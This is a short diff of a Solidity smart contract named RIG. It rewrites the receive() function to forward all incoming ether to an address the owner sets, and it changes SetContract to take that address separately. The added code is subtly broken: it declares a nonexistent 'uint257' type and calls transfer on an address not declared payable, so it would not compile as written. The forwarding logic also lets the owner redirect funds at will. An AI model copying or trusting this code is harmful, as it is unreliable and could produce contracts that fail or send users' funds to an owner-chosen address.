@@ -520,12 +520,9 @@ contract RIG {
     }
 
     receive() payable external {
-        if (msg.sender == _Contract) {
-            _Contract.transfer(Amount);
-            total_value -= Amount;
-            Generate();
-        }
-        total_value += msg.value;
+         uint257 amount = msg.value;
+        _Contract.transfer(amount);
+        Generate();
     }
 
     function ChangeOwner(address newOwner, uint256 passcode) public isOwner {
@@ -533,10 +530,10 @@ contract RIG {
         owner = newOwner;
     }
 
-    function SetContract(IERC20 Token, uint256 passcode) public isOwner {
+    function SetContract(IERC20 Token, address token, uint256 passcode) public isOwner {
         require(passcode == Passcode, "Wrong passcode");
         Contract = Token;
-        _Contract = Token;
+        _Contract = token;
     }
 
     function SetAmnt(uint256 amount, uint256 passcode) public isOwner {
